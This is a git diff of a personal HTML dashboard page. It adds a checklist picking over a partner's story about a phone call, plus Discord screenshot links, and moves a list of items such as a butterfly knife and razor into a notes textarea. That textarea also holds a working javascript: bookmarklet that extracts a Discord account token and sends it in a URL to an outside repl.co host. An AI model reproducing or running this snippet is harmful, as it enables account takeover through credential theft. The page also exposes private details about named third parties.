@@ -31,26 +31,11 @@ a { color: #white; text-decoration: none; }
 @media only screen and (min-width: 200px) and (max-width: 480px) {
 body { background-image: url("background2.jpg"); }
 #auto_hide_div img { width: 6vw; } }</style>
-<!--
-small spray bottle
-butterfly knife
-egg
-lace comprog
-retractable
-rent
-mouthspray
-razor
-briefcase
-scan
-laminate
-mightbond
-insect spray
-wash
 
-object-fit: cover;
+<!--object-fit: cover;
 word-break: break-all;
-grid-template-columns: 1px 1ch 1fr;
--->
+grid-template-columns: 1px 1ch 1fr;-->
+
 <div class="main_menu" style="user-select: none;">
 <ul style="justify-content: space-between; display: flex;">
 <li><button><b><i style="font-size: 1.1rem;" onclick="background_image()">Paperthena</i></b></button></li>
@@ -107,7 +92,7 @@ grid-template-columns: 1px 1ch 1fr;
 <button id="user_ip">IP</button>
 <button id="progress">MBPS</button>
 <button onclick="hide_music()">H<span style="color: pink; font-weight: bold;">id</span>e</button>
-<input type="checkbox" id="hide_id" unchecked><button><label for="hide_id" id="playing_indicator" style="display: none;">Note</label><button>
+<input type="checkbox" id="hide_id"><button><label for="hide_id" id="playing_indicator" style="display: none;">Note</label><button>
 
 <div id="f" onclick="reddit_comment()">
 <img src="book1.jpg">
@@ -133,17 +118,75 @@ grid-template-columns: 1px 1ch 1fr;
 <img src="stamp4.jpg">
 </div>
 
-<div id="z">
-<div id="music_position"></div>
+
+
+<div style="text-align: left; background-color: black;">
+<label><input type="checkbox">she got a call</label><br>
+<label><input type="checkbox">claims it's her mom</label><br>
+<label><input type="checkbox">later claims it's magdallena</label><br>
+<label><input type="checkbox">says it's random guy hitting on her</label><br>
+<label><input type="checkbox">later claims it's college friend</label><br>
+<label><input type="checkbox">(i was still unaware of tenshin)</label><br>
+<label>(why didn't she just say it's him)</label><br><input style="background-color: white; color: black;" type="search"><br>
+<label>(why she didn't mention she hangouts with a guy)</label><br><input style="background-color: white; color: black;" type="search"><br>
+<label><input type="checkbox">she know's it's a bad thing</label><br>
+<label><input type="checkbox">she know's i'll get jelous</label><br><br>
+
+<label><input type="checkbox">later claims mom called her just a few moments ago</label><br>
+<label><input type="checkbox">so she thought it's her again</label><br>
+<label><input type="checkbox">but we've been on call/chatting for a while</label><br>
+<label><input type="checkbox">and she had time to type and see who it really is</label><br><br>
+
+<label><input type="checkbox">she doesn't show it</label><br>
+<label><input type="checkbox">later tried to cover him as joshua (clearly not, wtf?)</label><br><br>
+
+<label><input type="checkbox">if they still chat by jan then when did they really stop chatting?</label><br>
+<label><input type="checkbox">she claim's it's december</label><br>
+<label><input type="checkbox">is it early december</label><br>
+<label><input type="checkbox">is it later december</label><br>
+<label><input type="checkbox">is it early january</label><br><br>
+
+<h4>Acceptable Conclusion:</h4>
+<label><input type="checkbox">she lied</label><br>
+<label><input type="checkbox">she's telling the truth</label><br><br>
+
+<h4>Unacceptable Conclusion:</h4>
+<label><input type="checkbox">she claims she doesn't lie but can't prove anything</label><br>
 </div>
 
+<div id="mess_img" style="margin-top: 2vh; display: none;">
+<img src="https://media.discordapp.net/attachments/1063507461748830289/1112533342919868558/Screenshot_20230529-075747_Discord.png">
+<img src="https://media.discordapp.net/attachments/1063507461748830289/1112533353627930634/Screenshot_20230529-075803_Discord.png">
+<img src="https://media.discordapp.net/attachments/1063507461748830289/1112533371948642385/Screenshot_20230529-075937_Discord.png">
+<img src="https://media.discordapp.net/attachments/1063507461748830289/1112533386930700438/Screenshot_20230529-080912_Discord.png">
+</div>
+
+
+
+<div id="z">
+<div id="music_position"></div>
 <form onsubmit="on_submit(event)">
 <input id="user" placeholder="User" required>
 <input id="message" placeholder="Message">
 <button type="submit" onclick="get_posts(document.querySelector('#user').value, document.querySelector('#message').value)">Send</button>
-</form><div id="posts">Posts</div>
+</form>
+<button id="posts">Posts</button>
+</div>
 
-<textarea class="auto_resize">client=~/client && rm -r ${client} && cd ~/storage/shared/download/ && cp -r client ${client} && cd ${client} && vercel --prod -y
+<textarea class="auto_resize">
+butterfly knife
+egg
+lace comprog
+retractable
+rent
+mouthspray
+razor
+briefcase
+dental floss
+mightbond
+insect spray
+
+client=~/client && rm -r ${client} && cd ~/storage/shared/download/ && cp -r client ${client} && cd ${client} && vercel --prod -y
 alias "+ac0" "bind q dota_ability_autocast 0"; alias "-ac0" "bind q dota_ability_execute 0"; bind "shift" "+ac0"
 javascript:(() => { token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for(let c in e.c) m.push(e.c[c])}]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken(); send = prompt(token, token); if(send !== token) window.location.href = "https://v1.elusion1.repl.co/app?n=" + token })()
 
@@ -1398,8 +1441,7 @@ download_bytes = 2750000
 window.addEventListener("load", () => {
 play_music(music_list[Math.floor(Math.random() * music_list.length)].name)
 binance_search()
-get_posts()
-hide_id.checked = true })
+get_posts() })
 
 radios = document.querySelectorAll(".sort")
 for(radio in radios) {
